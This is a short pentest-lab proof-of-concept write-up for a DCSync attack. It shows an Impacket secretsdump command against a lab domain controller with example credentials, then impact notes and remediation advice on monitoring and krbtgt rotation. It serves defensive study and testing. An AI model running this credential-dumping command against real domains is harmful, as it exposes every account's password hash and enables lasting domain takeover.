# POC-06 – Domain Compromise: DCSync

**ATT&CK:** T1003.006 – OS Credential Dumping: DCSync
**Host:** Kali → Domain Controller
**Tools:** Impacket (`secretsdump.py`)

## Prerequisite
A compromised account that holds (or that you've escalated to hold) `Replicating Directory Changes` and `Replicating Directory Changes All` rights — typically Domain Admin, or a principal BloodHound flagged with DCSync rights in POC-04.

## Steps

### 1. Perform DCSync
```bash
impacket-secretsdump lab.local/domainadmin:'Password123'@192.168.56.10
```

### 2. Review output
`secretsdump` dumps NTLM hashes for every domain account, including `krbtgt` — the account used to forge Golden Tickets.

## Observation
Record the number of accounts dumped and confirm the `krbtgt` hash was retrieved.

## Evidence
`![secretsdump DCSync output](screenshots/poc06-dcsync.png)`

## Impact
DCSync gives an attacker every credential in the domain, including `krbtgt`, enabling persistent, essentially undetectable re-entry via Golden Ticket attacks even after passwords are reset. This represents full domain compromise.

## Remediation
Minimize the number of accounts with DCSync-equivalent rights, monitor for Directory Replication Service (DRS) requests from non-DC hosts (Event ID 4662), rotate the `krbtgt` password twice after any suspected compromise, and apply tiered administration (Microsoft's AD administrative tier model).
